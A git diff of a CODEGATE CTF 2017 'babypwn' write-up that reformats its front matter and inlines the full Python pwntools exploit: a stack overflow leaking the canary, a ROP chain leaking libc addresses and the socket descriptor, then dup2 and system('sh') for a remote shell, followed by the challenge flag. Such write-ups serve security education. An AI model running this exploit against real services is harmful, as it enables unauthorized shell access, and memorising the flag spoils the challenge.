@@ -1,12 +1,12 @@
 title: '[CODEGATE CTF 2017] babypwn 50'
 author: Naetw
 tags:
-- CODEGATE CTF 2017
-- pwn
-- ROP
-- stack overflow
+  - CODEGATE CTF 2017
+  - pwn
+  - ROP
+  - stack overflow
 categories:
-- write-ups
+  - write-ups
 date: 2017-02-11 23:33:00
 ---
 
@@ -14,7 +14,7 @@ date: 2017-02-11 23:33:00
 
 32 bits ELF, Partial RELRO, with canary & NX, no PIE.
 
-There is an obvious stack overflow vulnerablility, but this program uses `socket`, actually I haven't learned about socket programing so I won't talk too much about it, since all we need to do due to `fork` is dealing with file descriptor. 
+There is an obvious stack overflow vulnerablility, but this program uses `socket`, actually I haven't learned about socket programing so I won't talk too much about it, since all we need to do is dealing with file descriptor due to `fork`. 
 
 Main operation is in `0x08048A71` function, and previous operation was setup of socket or sth. If you want to test this program locally:
 
@@ -105,6 +105,83 @@ payload = 'A'*40 +      # padding to canary
 
 Again, choose the choice 3 to return then open the shell!
 
-[Exploit Code](https://github.com/Naetw/CTF-write-up/blob/master/CODEGATE-2017/babypwn/ex.py)
+```python
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+from pwn import * # pip install pwntools
+import sys
+
+ip = '127.0.0.1'
+port = 8181
+reip = '110.10.212.130'
+report = 8888
+
+r = remote(ip, port)
+#r = remote(reip, report)
+
+# Default address & libc setting
+echo_select = 0x08048a71
+socket_send = 0x080488b1
+sigemptyset_got = 0x0804b048
+fd = 0x0804b1b8
+pop1 = 0x08048589
+pop2 = 0x08048b84
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#libc = ELF('libc.so')
+
+def echo(payload):
+    r.recvuntil('>')
+    r.sendline('1')
+    r.recvuntil(':')
+    r.send(payload)
+
+# Leak canary
+echo('A' * 40 + '\n')
+r.recvline()
+canary = r.recv(3)
+canary = u32('\x00' + canary)
+log.info(hex(canary))
+
+
+# Leak libc function address and File Descripter
+rop1 = [socket_send, pop1, sigemptyset_got, socket_send, echo_select, fd]
+payload = 'A'*40 + p32(canary) +'A'*12 + ''.join(map(p32, rop1))
+echo(payload + '\n')
+r.recvuntil('>') 
+r.sendline('3') # Use exit to ret to rop
+r.recv()
+sig = u32(r.recv(4))
+listen = u32(r.recv(4))
+atoi = u32(r.recv(4))
+r.recv()
+fd = ord(r.recv(1))
+log.info('sigemptyset : ' + hex(sig) + '\n' + 
+        'listen : ' + hex(listen) + '\n' +
+        'atoi : ' + hex(atoi) + '\n' +
+        'fd : ' + hex(fd))
+
+''' Here I use http://libcdb.com '''
+base = atoi - libc.symbols['atoi']
+dup2 = base + libc.symbols['dup2']
+system = 0x08048620
+read = base + libc.symbols['read']
+log.info('base : ' + hex(base))
+sh = base + next(libc.search('sh\x00'))
+
+
+# Duplicate fd and stdout & stdin(in order to use shell)
+rop2 = [dup2, pop2, fd, 1,
+        dup2, pop2, fd, 0,
+        system, 0xdeadbeef, sh]
+payload = 'A'*40 + p32(canary) + 'A'*12 + ''.join(map(p32, rop2))
+echo(payload)
+
+# Use exit to ret to rop2
+sleep(0.1)
+r.sendline('3')
+
+r.interactive()
+```
 
 `FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}`
